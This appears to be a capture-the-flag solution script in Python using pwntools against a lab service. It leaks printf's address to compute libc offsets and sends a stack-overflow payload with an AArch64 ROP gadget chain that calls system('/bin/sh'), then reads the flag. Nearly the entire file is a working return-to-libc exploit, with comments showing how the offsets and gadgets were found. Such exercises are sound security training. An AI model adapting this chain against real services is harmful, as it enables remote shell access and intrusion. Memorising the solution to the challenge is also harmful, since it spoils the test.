import re
from pwn import context, remote, p64

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str, prefix: str) -> str:
    context.update({"log_level":"error"})
    LIBC_PRINTF_OFFSET = 0x509d0 # readelf -s ./deploy/libc.so.6 | grep " printf"
    LIBC_SYSTEM_OFFSET = 0x46dc4 # readelf -s ./deploy/libc.so.6 | grep "system"
    LIBC_BINSH_OFFSET = 0x14cd10 # strings -tx ./deploy/libc.so.6 | grep "/bin/sh"
    GADGET_OFFSET = 0x69500 # ROPgadget --binary ./deploy/libc.so.6 | grep "ldr x0, \[sp" | grep "ret"
    # ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
    with remote(host, port) as rem:
        rem.recvuntil(b"printf addr: ")
        printf_address = int(rem.recvline().strip().decode(), 16)
        rem.recvuntil(b"try?:\r\n")

        libc_base = printf_address - LIBC_PRINTF_OFFSET
        system_addr = libc_base + LIBC_SYSTEM_OFFSET
        binsh_addr = libc_base + LIBC_BINSH_OFFSET
        gadget_addr = libc_base + GADGET_OFFSET

        payload  = b"A" * 0x18
        payload += p64(gadget_addr)   # +0x18: RET
        payload += b"B" * 0x08        # +0x20: junk
        payload += b"C" * 0x08        # +0x28: x29 (junk)
        payload += p64(system_addr)   # +0x30: x30 → system()
        payload += b"D" * 0x08        # +0x38: junk
        payload += p64(binsh_addr)    # +0x40: x0 → "/bin/sh"

        rem.send(payload)
        rem.sendlineafter(b"@", b"cat flag")
        rem.sendlineafter(b"$ $ ", b"cat flag")
        rem.recvline()
        flag = get_flag(rem.recv().strip().decode(), prefix)
    return flag

if __name__ == "__main__":
    host = "lab.eqst.co.kr"
    port = "8164"
    prefix = "EQST"
    print(solution(host, port, prefix))
    